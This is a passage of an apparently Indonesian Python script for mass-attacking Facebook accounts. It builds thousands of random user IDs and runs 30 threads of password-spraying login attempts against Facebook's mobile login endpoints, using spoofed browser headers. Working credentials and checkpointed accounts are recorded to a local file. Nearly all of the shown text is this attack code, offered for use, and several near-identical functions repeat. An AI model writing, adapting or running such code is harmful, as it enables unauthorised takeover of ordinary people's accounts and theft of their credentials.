			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz398(self):
		x = 111111111
		xx = 999999999
		idx = "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzz298(self):
		x = 111111111
		xx = 999999999
		idx = "2"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.xfacebook4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def xfacebook4(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://x.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://x.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://x.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s \x1b[38;5;231m<─> %s%s %s•%s 2007%s <─> %s2008"%(K,uid,K,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_iphone4(self):
		print("")
		print(f"{P} [{H}1{P}] Cloning Id Running (1)94xxx")
		print(f"{P} [{H}2{P}] Cloning Id Running (2)94xxx")
		print(f"{P} [{H}3{P}] Cloning Id Running (3)94xxx")
		print(f"{P} [{H}4{P}] Cloning Id Running (4)94xxx")
		print(f"{P} [{H}5{P}] Cloning Id Running (5)94xxx")
		print(f"{P} [{H}6{P}] Cloning Id Running (6)94xxx")
		print(f"{P} [{H}7{P}] Cloning Id Running (7)94xxx")
		print(f"{P} [{H}8{P}] Cloning Id Running (8)94xxx")
		print(f"{P} [{H}9{P}] Cloning Id Running (9)94xxx")
		print(f"{P} [{H}10{P}] Cloning Id Running Random Id")
		Runn = input(f"{P} Pilih : ")
		if Runn in ["1"]:
			self.runzzzzz198()
		elif Runn in ["2"]:
			self.runzzzzz298()
		elif Runn in ["3"]:
			self.runzzzzz398()
		elif Runn in ["4"]:
			self.runzzzzz498()
		elif Runn in ["5"]:
			self.runzzzzz598()
		elif Runn in ["6"]:
			self.runzzzzz698()
		elif Runn in ["7"]:
			self.runzzzzz798()
		elif Runn in ["8"]:
			self.runzzzzz898()
		elif Runn in ["9"]:
			self.runzzzzz998()
		elif Runn in ["10"]:
			self.runzzzzzRandomly()
		else:
			print(f" {P} Isi Yang Benar") 
			self.old_basic4()
			
	def runzzzzzRandomly(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		x2 = 111111111
		xx2 = 999999999
		idx2 = "2"
		x3 = 111111111
		xx3 = 999999999
		idx3 = "3"
		x4 = 111111111
		xx4 = 999999999
		idx4 = "4"
		x5 = 111111111
		xx5 = 999999999
		idx5 = "5"
		x6 = 111111111
		xx6 = 999999999
		idx6 = "6"
		x7 = 111111111
		xx7 = 999999999
		idx7 = "7"
		x8 = 111111111
		xx8 = 999999999
		idx8 = "8"
		x9 = 111111111
		xx9 = 999999999
		idx9 = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_)), 
				_ = random.randint(x2,xx2)
				__ = idx2
				self.id.append(__+str(_)), 
				_ = random.randint(x3,xx3)
				__ = idx3
				self.id.append(__+str(_))
				_ = random.randint(x4,xx4)
				__ = idx4
				self.id.append(__+str(_)), 
				_ = random.randint(x5,xx5)
				__ = idx5
				self.id.append(__+str(_)), 
				_ = random.randint(x6,xx6)
				__ = idx6
				self.id.append(__+str(_)), 
				_ = random.randint(x7,xx7)
				__ = idx7
				self.id.append(__+str(_)), 
				_ = random.randint(x8,xx8)
				__ = idx8
				self.id.append(__+str(_)), 
				_ = random.randint(x9,xx9)
				__ = idx9
				self.id.append(__+str(_))
				random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz198(self):
		x = 111111111
		xx = 999999999
		idx = "1"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz998(self):
		x = 111111111
		xx = 999999999
		idx = "9"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz898(self):
		x = 111111111
		xx = 999999999
		idx = "8"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_)) 
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz798(self):
		x = 111111111
		xx = 999999999
		idx = "7"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali") 
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz698(self):
		x = 111111111
		xx = 999999999
		idx = "6"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz598(self):
		x = 111111111
		xx = 999999999
		idx = "5"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz498(self):
		x = 111111111
		xx = 999999999
		idx = "4"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz398(self):
		x = 111111111
		xx = 999999999
		idx = "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
				#random.choice(self.id)
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))
			
	def runzzzzz298(self):
		x = 111111111
		xx = 999999999
		idx = "2"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				#+listpass = ["123123","789789","567567"]
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.iphone4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def iphone4(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uid,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+='sb=DUF_YgGHnqbuElsNb2GnCwwA'+'fr=0J7go4BET8F13oVhh.AWWK56FqQ0wX6pXDAeB-lnBXmz8.BifVsR.o5.AAA.0.0.Bik2nV.AWW7Gs7QJh8'+'datr=D0F_YiifrGchuoT-aW7q5BL'+'m_pixel_ratio=1.5; wd=320x472'
			heade={'Host': 'IPhone.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://IPhone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'none','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://IPhone.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://IPhone.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,headers=heade,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				print("\r %s[OK] %s <─> %s %s•%s 2007%s <─> %s2008"%(H,uid,pw,P,O,P,H))
				self.ok.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print("\r %s[CP] %s <─> %s %s•%s 2007%s <─> %s2008"%(K,uid,pw,P,O,P,H))
				self.cp.append("%s|%s"%(uid, pw))
				open("2007-08CpOk.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1
	
	def old_mobile4(self):
		x = 111111111
		xx = 999999999
		idx ="1", "2", "3"
		print("%s Kalo Anda Limit %s2000\x1b[38;5;231m Id Berarti %s8000 \x1b[38;5;231mId, Karena Saya Satuin Id Old  Sampai Muda Terbagi jadi %s2000 \x1b[38;5;231mper id muda/old dan random id"%(P,H,K,M))
		limit = int(input(f" {P}Id Limit {M}50,000 {P}:{M} "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print(" %sTotal : %s%s"%(P,M,len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				pwx = ["789789","123123","345345"]
				print("%s Contoh Password (%s123456%s)"%(P,M,P))
				listpass = input("%s List Password :%s "%(P,M))
				if len(listpass)<=5:
					exit("\n%s Password Minimal 6 Angka"%(M))
				print("%s List Password Crack %s%s\n"%(P,M,listpass))
				#os.system("clear")
				for user in self.id:
					coeg.submit(self.mobile4, user, listpass.split(","))
			print("")
			if len(self.ok) != 0 or len(self.cp) != 0:
				print("\n %sHasil Cp Mu :%s %s"%(P,K,len(self.cp)))
				print(" %sHasil Ok Mu :%s %s"%(P,H,len(self.ok)))
				input(f" {P}Kembali")
				self.kk()
			else:
				print("\n%s Kok Gada Hasil? Makanya Ganteng Klo Gk Ganteng Kemungkinan Kecil Dapet Result, Intinya Makanya Ganteng Ajg:v"%(P))
				input(f" {P}Kembali")
				Main()
		except Exception as e:exit(str(e))

	def mobile4(self, uid, pwx):
		#nip=random.choice(prox)
		#rpx= {'http': 'socks4://'+nip}
		ua = random.choice(rua2)
		randomwar = random.choice([P,H,M])
		sys.stdout.write(
			"\r %s%s|%s%s%s/%s%s %sOk:/%s %sCp:/%s"%(uid,P,randomwar,len(self.id),P,randomwar,self.loop,H,len(self.ok),Y,len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
